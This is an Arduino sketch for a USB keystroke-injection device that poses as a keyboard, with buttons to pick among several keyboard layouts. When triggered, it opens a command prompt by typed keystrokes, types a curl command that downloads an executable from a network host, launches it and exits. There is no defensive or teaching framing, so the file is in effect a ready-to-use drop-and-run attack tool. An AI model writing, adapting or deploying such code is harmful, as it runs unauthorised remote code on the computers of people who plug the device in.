//Constante
#define PIN_BUTTON_CONFIG 2
#define PIN_BUTTON_RESET 3
#define PIN_BUTTON_START 4

#define STATE_US 0
#define STATE_FR 1
#define STATE_USA 2
#define STATE_DE 3
#define STATE_IT 4
#define STATE_SE 5
#define STATE_ES 6
#define STATE_DK 7

#include <Keyboard.h> 

int keyBoardState = 0;
int start = 0;


void setup()
{ 
  //Setup Buttons
  pinMode(PIN_BUTTON_CONFIG,INPUT);
  pinMode(PIN_BUTTON_RESET,INPUT);
  pinMode(PIN_BUTTON_START,INPUT);
}

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

// Unused
void loop() {

  do{
    short btnConfig = digitalRead(PIN_BUTTON_CONFIG);
    short btnReset = digitalRead(PIN_BUTTON_RESET);
    short btnStart = digitalRead(PIN_BUTTON_START);

    if(btnReset == 0){
      start  = 0;
      keyBoardState = STATE_US;
      delay(500);
    }

    if(btnConfig == 0){
      keyBoardState++;
      delay(500);
    }

    if(btnStart == 0){
      start = start == 1 ? 0:1;
      delay(500);
    }  
  }while(start != 1);

  Serial.println(keyBoardState);
  switch(keyBoardState){
    case STATE_US:
      Keyboard.begin();
      break;
     case STATE_FR:
      Keyboard.begin(KeyboardLayout_fr_FR);
      break;
     case STATE_USA:
      Keyboard.begin(KeyboardLayout_en_US);
      break;
     case STATE_DE:
      Keyboard.begin(KeyboardLayout_de_DE);
      break;
     case STATE_IT:
      Keyboard.begin(KeyboardLayout_it_IT);
      break;
     case STATE_SE:
      Keyboard.begin(KeyboardLayout_sv_SE);
      break;
     case STATE_ES:
      Keyboard.begin(KeyboardLayout_es_ES);
      break;
     case STATE_DK:
      Keyboard.begin(KeyboardLayout_da_DK);
      break;
  }

   // Waiting 500ms for init
  delay(500);
  
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(400);

  Keyboard.print("cmd");

  delay(700);

  typeKey(KEY_RETURN);

  delay(700);

  Keyboard.print("curl http://192.168.0.108/stup.exe --output s.exe");

  typeKey(KEY_RETURN);

  Keyboard.print("start s.exe");

  typeKey(KEY_RETURN);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  start = 0;
  keyBoardState = 0;
  Keyboard.end();
}
